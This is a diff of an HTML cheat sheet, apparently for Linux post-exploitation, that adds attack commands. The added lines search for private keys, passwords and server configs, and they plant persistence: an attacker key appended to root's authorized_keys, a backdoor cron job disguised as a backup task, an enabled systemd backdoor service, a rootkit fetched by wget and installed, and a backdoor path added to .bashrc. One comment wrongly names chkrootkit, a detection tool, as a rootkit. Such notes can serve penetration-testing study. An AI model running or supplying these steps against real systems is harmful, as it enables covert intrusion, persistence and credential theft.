@@ -120,6 +120,13 @@
 /etc/ssh/ssh_host_<span class="k">*</span>
 /home/<span class="k">*</span>/.ssh/id_<span class="k">*</span>
 /root/.ssh/id_<span class="k">*</span>
+
+<span class="c"># Find additional sensitive files</span>
+find / <span class="nt">-name</span> <span class="s2">"*.pem"</span> 2&gt;/dev/null
+<span class="nb">grep</span> <span class="nt">-r</span> <span class="s2">"password"</span> / 2&gt;/dev/null
+<span class="nb">cat</span> /var/www/html/config.php
+<span class="nb">cat</span> /etc/nginx/nginx.conf
+<span class="nb">cat</span> /etc/apache2/sites-enabled/<span class="k">*</span>
 </code></pre></div></div>
 
 <h3 id="network-information">Network Information</h3>
@@ -128,26 +135,51 @@ ip neighbor
 route <span class="nt">-n</span>
 <span class="nb">cat</span> /etc/hosts
 <span class="nb">cat</span> /etc/resolv.conf
+
+<span class="c"># External network mapping</span>
+nmap <span class="nt">-sn</span> &lt;network&gt;
+
+<span class="c"># Check DNS for pivoting</span>
+dig &lt;domain&gt;
 </code></pre></div></div>
 
 <h3 id="process-information">Process Information</h3>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps auxf
 pstree <span class="nt">-a</span>
 lsof <span class="nt">-i</span>
+
+<span class="c"># Check scheduled tasks</span>
+crontab <span class="nt">-l</span>
+<span class="nb">cat</span> /etc/cron.<span class="k">*</span>
+<span class="nb">cat</span> /etc/cron.d/<span class="k">*</span>
+
+<span class="c"># Real-time process monitoring</span>
+pspy64: <span class="sb">`</span>./pspy64<span class="sb">`</span>
 </code></pre></div></div>
 
 <h2 id="persistence-techniques">Persistence Techniques</h2>
 
-<h3 id="ssh-keys">SSH Keys</h3>
-<ul>
-  <li>Generate new SSH key pair</li>
-  <li>Add to authorized_keys</li>
-  <li>Modify SSH configuration</li>
-</ul>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Generate SSH key</span>
+ssh-keygen <span class="nt">-t</span> rsa <span class="nt">-b</span> 4096
+
+<span class="c"># Copy public key</span>
+<span class="nb">echo</span> <span class="s2">"your_public_key"</span> <span class="o">&gt;&gt;</span> /root/.ssh/authorized_keys
+<span class="nb">echo</span> <span class="s2">"your_public_key"</span> <span class="o">&gt;&gt;</span> /home/user/.ssh/authorized_keys
+
+<span class="c"># Modify SSH config</span>
+<span class="nb">echo</span> <span class="s2">"AllowUsers yourusername"</span> <span class="o">&gt;&gt;</span> /etc/ssh/sshd_config
+ssh-copy-id user@target
+</code></pre></div></div>
 
 <h3 id="cron-jobs">Cron Jobs</h3>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Add persistent cron job</span>
 <span class="nb">echo</span> <span class="s2">"* * * * * /path/to/backdoor"</span> <span class="o">&gt;&gt;</span> /var/spool/cron/crontabs/root
+
+<span class="c"># Mask cron job as legit task</span>
+<span class="nb">echo</span> <span class="s2">"0 0 * * * /usr/bin/backup.sh"</span> <span class="o">&gt;&gt;</span> /etc/cron.daily/backup
+
+<span class="c"># Verify cron jobs</span>
+crontab <span class="nt">-u</span> root <span class="nt">-l</span>
 </code></pre></div></div>
 
 <h3 id="service-creation">Service Creation</h3>
@@ -162,7 +194,27 @@ ExecStart=/path/to/backdoor
 [Install]
 WantedBy=multi-user.target
 </span><span class="no">EOF
-</span></code></pre></div></div>
+
+</span><span class="c"># Enable and start service</span>
+systemctl <span class="nb">enable </span>backdoor.service
+systemctl start backdoor.service
+
+<span class="c"># Check service status</span>
+systemctl status backdoor.service
+</code></pre></div></div>
+
+<h3 id="rootkit-installation">Rootkit Installation</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Install simple rootkit (example: chkrootkit or knark)</span>
+wget &lt;rootkit_url&gt; <span class="nt">-O</span> rootkit.tar.gz
+<span class="nb">tar</span> <span class="nt">-xzf</span> rootkit.tar.gz
+<span class="nb">cd </span>rootkit
+make <span class="nb">install</span>
+</code></pre></div></div>
+
+<h3 id="environmental-variables">Environmental Variables</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Add persistent environment variable</span>
+<span class="nb">echo</span> <span class="s2">"export PATH=</span><span class="nv">$PATH</span><span class="s2">:/path/to/backdoor"</span> <span class="o">&gt;&gt;</span> /root/.bashrc
+</code></pre></div></div>
 
           </div>
         </div>
